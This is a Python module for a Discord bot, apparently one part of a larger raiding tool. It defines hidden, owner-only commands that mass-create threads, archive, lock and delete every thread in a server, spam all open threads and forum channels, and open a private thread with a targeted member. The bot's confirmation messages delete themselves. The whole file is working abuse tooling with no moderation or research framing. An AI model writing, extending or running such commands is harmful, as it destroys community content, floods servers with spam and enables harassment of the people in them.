import discord
from discord.ext import commands
import asyncio

class ThreadBomb(commands.Cog, name="thread_bomb"):
    """81-87: thread and forum manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def threadbomb(self, ctx: commands.Context, count: int = 30, *, name: str = "chaos"):
        """81. create many threads in a channel."""
        channel = ctx.channel
        created = 0
        for i in range(count):
            try:
                await channel.create_thread(name=f"{name}-{i}", type=discord.ChannelType.public_thread)
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def archvethreads(self, ctx: commands.Context):
        """82. archive all active threads."""
        count = 0
        for thread in ctx.guild.threads:
            try:
                await thread.edit(archived=True, locked=True)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"archived {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletethreads(self, ctx: commands.Context):
        """83. delete all threads."""
        count = 0
        for thread in ctx.guild.threads:
            try:
                await thread.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"deleted {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unarchivethreads(self, ctx: commands.Context):
        """84. unarchive all archived threads."""
        count = 0
        for thread in ctx.guild.threads:
            if thread.archived:
                try:
                    await thread.edit(archived=False, locked=False)
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        await ctx.send(f"unarchived {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def threadspam(self, ctx: commands.Context, count: int = 5, *, message: str = "thread spam"):
        """85. send a message to all threads."""
        sent = 0
        for thread in ctx.guild.threads:
            if not thread.archived:
                try:
                    await thread.send(message)
                    sent += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"messaged {sent} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def forumspam(self, ctx: commands.Context, count: int = 20, *, name: str = "post"):
        """86. create posts in forum channels."""
        created = 0
        for channel in ctx.guild.forums:
            for i in range(count):
                try:
                    await channel.create_thread(name=f"{name}-{i}", content="spam")
                    created += 1
                    await asyncio.sleep(0.5)
                except:
                    break
        await ctx.send(f"created {created} forum posts.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def privatethread(self, ctx: commands.Context, target: discord.Member):
        """87. create a private thread with a target."""
        thread = await ctx.channel.create_thread(
            name=f"private-{target.name}",
            type=discord.ChannelType.private_thread,
        )
        await thread.add_user(target)
        await ctx.send(f"private thread created with {target.mention}.", delete_after=5)


async def setup(bot: commands.Bot):
    await bot.add_cog(ThreadBomb(bot))
